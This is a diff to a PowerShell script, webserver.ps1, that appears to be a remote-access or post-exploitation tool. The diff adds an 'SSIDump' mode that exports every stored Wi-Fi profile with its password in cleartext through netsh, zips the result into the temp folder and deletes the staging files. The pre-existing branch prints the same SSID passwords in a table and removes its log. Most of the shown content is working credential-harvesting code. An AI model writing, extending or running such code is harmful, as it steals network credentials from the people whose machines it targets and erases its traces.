@@ -86,6 +86,10 @@
    Remote Host Web Browser Enumeration, DNS Records, DHCP
    User-Agent, Default Browser, TCP Headers, MainWindowTitle
 
+   PS C:\> .\webserver.ps1 -SEnum SSIDump
+   Store SSID Passwords dump into a zip file insted
+   of display stored passwords in terminal windows.
+
 .EXAMPLE
    PS C:\> .\webserver.ps1 -Sessions List
    Enumerate active @webserver sessions OR
@@ -525,7 +529,7 @@ If(-not($Installation) -or $Installation -ieq $null){
    }
 
    ## WebBrowser Enumeration (-SEnum True)
-   If($SEnum -ieq "True"){
+   If($SEnum -ieq "True" -or $SEnum -ieq "SSIDump"){
 
       <#
       .SYNOPSIS
@@ -538,6 +542,10 @@ If(-not($Installation) -or $Installation -ieq $null){
       .EXAMPLE
          PS C:\> .\webserver.ps1 -SEnum True
          Remote Host Web Browser Simple Enumeration ..
+
+      .EXAMPLE
+         PS C:\> .\webserver.ps1 -SEnum SSIDump
+         Store SSID Passwords dump into a zip file ..
       #>
 
       ## Internal Variable Declarations
@@ -600,24 +608,35 @@ If(-not($Installation) -or $Installation -ieq $null){
       Write-Host ""
 
       ## Capture wlan interface passwords
-      $profiles = netsh wlan show profiles|findstr /C:"All User Profile"
-      $DataParse = $profiles -replace 'All User Profile     :','' -replace ' ',''
+      If($SEnum -ieq "SSIDump"){
+         ## Dump SSID passwords into a zip file
+         $DumpFolder = "SSIDump";$DumpFile = "SSIDump.zip"
+         If(-not(Test-Path "$Env:TMP\$DumpFolder")){New-Item "$Env:TMP\$DumpFolder" -ItemType Directory -Force|Out-Null}
+         netsh wlan export profile folder=$Env:TMP\$DumpFolder key=clear|Out-Null
+         Compress-Archive -Path "$Env:TMP\$DumpFolder" -DestinationPath "$Env:TMP\SSIDump.zip"
+         Write-Host "SSID Dump stored under: $Env:TMP\SSIDump.zip" -ForeGroundColor Yellow
+         Start-Sleep -Seconds 2;Remove-Item "$Env:TMP\$DumpFolder" -Recurse -Force|Out-Null
+      }Else{
+         ## Dump SSID passwords into terminal prompt
+         $profiles = netsh wlan show profiles|findstr /C:"All User Profile"
+         $DataParse = $profiles -replace 'All User Profile     :','' -replace ' ',''
 
-      ## Create Data Table for output
-      $mytable = new-object System.Data.DataTable
-      $mytable.Columns.Add("SSID name") | Out-Null
-      $mytable.Columns.Add("Password") | Out-Null
+         ## Create Data Table for output
+         $mytable = new-object System.Data.DataTable
+         $mytable.Columns.Add("SSID name") | Out-Null
+         $mytable.Columns.Add("Password") | Out-Null
 
-      foreach($Token in $DataParse){
-         $DataToken = netsh wlan show profile name="$Token" key=clear|findstr /C:"Key Content"
-         $Key = $DataToken -replace 'Key Content            : ','' -replace ' ',''
-         ## Put results in the data table   
-         $mytable.Rows.Add("$Token",
-                           "$Key") | Out-Null
+         foreach($Token in $DataParse){
+            $DataToken = netsh wlan show profile name="$Token" key=clear|findstr /C:"Key Content"
+            $Key = $DataToken -replace 'Key Content            : ','' -replace ' ',''
+            ## Put results in the data table   
+            $mytable.Rows.Add("$Token",
+                              "$Key") | Out-Null
+         }
+         ## Display Table
+         $mytable|Format-Table -AutoSize > $Env:TMP\lk.log
+         Get-Content $Env:TMP\lk.log;Remove-Item $Env:TMP\lk.log -Force
       }
-      ## Display Table
-      $mytable|Format-Table -AutoSize > $Env:TMP\lk.log
-      Get-Content $Env:TMP\lk.log;Remove-Item $Env:TMP\lk.log -Force
    }
 }
 
